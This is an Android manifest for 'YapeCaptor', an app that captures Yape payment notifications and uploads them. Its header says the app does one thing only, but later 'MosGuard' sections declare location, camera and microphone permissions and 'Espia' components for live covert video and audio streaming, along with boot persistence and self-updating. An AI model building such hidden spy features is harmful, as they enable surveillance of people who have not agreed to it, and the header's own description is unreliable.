<?xml version="1.0" encoding="utf-8"?>
<!--
  YapeCaptor — captura las notificaciones de Yape de ESTE celular y las manda a Supabase.

  Hace UNA sola cosa, a propósito: leer la notificación, sacarle el monto y el nombre, y
  entregarla. No abre Yape, no toca el banco, no lee otras apps. El permiso que pide (acceso
  a notificaciones) lo concede el dueño del equipo a mano, en Ajustes, y se puede quitar
  cuando quiera.

  INTERNET es el único permiso "peligroso" de la lista: sin él no puede entregar nada.
-->
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <!-- para que el servicio siga vivo con la pantalla apagada -->
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
    <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
    <!-- el guardia: mantiene CPU y Wi-Fi despiertos para que el push de Yape no se enfríe -->
    <uses-permission android:name="android.permission.WAKE_LOCK" />
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
    <!-- para poder PEDIR que Android no lo apague; el usuario acepta o no -->
    <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
    <!-- para poder ABRIR el instalador con la version nueva; Android igual pide confirmacion -->
    <uses-permission android:name="android.permission.REQUEST_INSTALL_PACKAGES" />
    <!-- [MosGuard] resguardo del equipo: ubicación + cámara (foto/cuadros). El dueño activa por equipo desde MOS. -->
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_CAMERA" />
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_MICROPHONE" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
    <uses-feature android:name="android.hardware.camera.any" android:required="false" />

    <application
        android:allowBackup="false"
        android:icon="@mipmap/ic_launcher"
        android:label="${appLabel}"
        android:supportsRtl="true"
        android:usesCleartextTraffic="false"
        android:theme="@style/Theme.YapeCaptor">

        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:label="${appLabel}">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <!--
          El lector de notificaciones. Android solo se lo entrega a servicios con este
          permiso Y con el acceso concedido a mano en Ajustes → Acceso a notificaciones.
        -->
        <service
            android:name=".YapeListener"
            android:exported="true"
            android:label="${appLabel}"
            android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE">
            <intent-filter>
                <action android:name="android.service.notification.NotificationListenerService" />
            </intent-filter>
        </service>

        <!-- [MosGuard] cámara de resguardo (foto/cuadros). Foreground service tipo camera. -->
        <!-- [MosGuard] Spy 2.0: video+audio en vivo por WebView (reusa el motor de espía) -->
        <activity
            android:name=".EspiaGuard"
            android:exported="false"
            android:excludeFromRecents="true"
            android:theme="@style/Theme.YapeCaptor" />

        <service
            android:name=".CamaraGuard"
            android:exported="false"
            android:foregroundServiceType="camera" />

        <!-- [MosGuard · Spy 2.0 nativo] video+audio en vivo con WebRTC nativo (sin WebView) -->
        <service
            android:name=".EspiaNativo"
            android:exported="false"
            android:foregroundServiceType="camera|microphone" />

        <!-- reintenta lo que quedó en cola cuando vuelve la señal -->
        <service
            android:name=".ColaService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- el guardia: CPU + Wi-Fi despiertos y un ping cada 2,5 min; re-ata el listener -->
        <service
            android:name=".GuardiaService"
            android:exported="false"
            android:foregroundServiceType="dataSync" />

        <!-- entrega el APK descargado al instalador del sistema, sin exponer nada mas -->
        <provider
            android:name="androidx.core.content.FileProvider"
            android:authorities="${applicationId}.fileprovider"
            android:exported="false"
            android:grantUriPermissions="true">
            <meta-data
                android:name="android.support.FILE_PROVIDER_PATHS"
                android:resource="@xml/file_paths" />
        </provider>

        <!-- avisa cada 15 min que el equipo sigue capturando -->
        <receiver android:name=".LatidoReceiver" android:exported="false" />

        <receiver
            android:name=".BootReceiver"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.QUICKBOOT_POWERON" />
                <action android:name="com.htc.intent.action.QUICKBOOT_POWERON" />
            </intent-filter>
        </receiver>
    </application>
</manifest>
